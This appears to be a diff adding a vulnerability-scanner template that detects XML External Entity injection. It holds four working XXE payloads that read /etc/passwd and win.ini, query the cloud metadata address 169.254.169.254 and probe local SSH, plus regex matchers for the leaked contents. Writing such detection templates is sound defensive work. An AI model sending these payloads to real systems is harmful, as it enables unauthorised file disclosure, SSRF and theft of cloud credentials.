@@ -1,0 +1,40 @@
+id: generic-xxe
+info:
+  name: XML External Entity Injection
+  description: Detects XXE via malicious XML payloads
+  owasp_category: A05:2025
+  severity: high
+  tags:
+    - xxe
+    - xml
+    - injection
+    - generic
+
+generic:
+  endpoint: "{{xxe}}"
+  method: POST
+  parameter: "xml"
+  content_type: "application/xml"
+
+  payloads:
+    - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"
+    - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+    - "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>"
+
+  matchers:
+    - type: status
+      status: [200, 201, 202]
+
+    - type: regex
+      condition: or
+      regex:
+        - "root:x:\\d+:\\d+:"
+        - "root:x:0:0:"
+        - "\\[.*?\\]\\s*;\\s*\\[.*?\\]"
+        - "extensions="
+        - "FOR 16-bit"
+        - "ami-id"
+        - "SSH-2\\.0"
+
+  matchers_condition: and
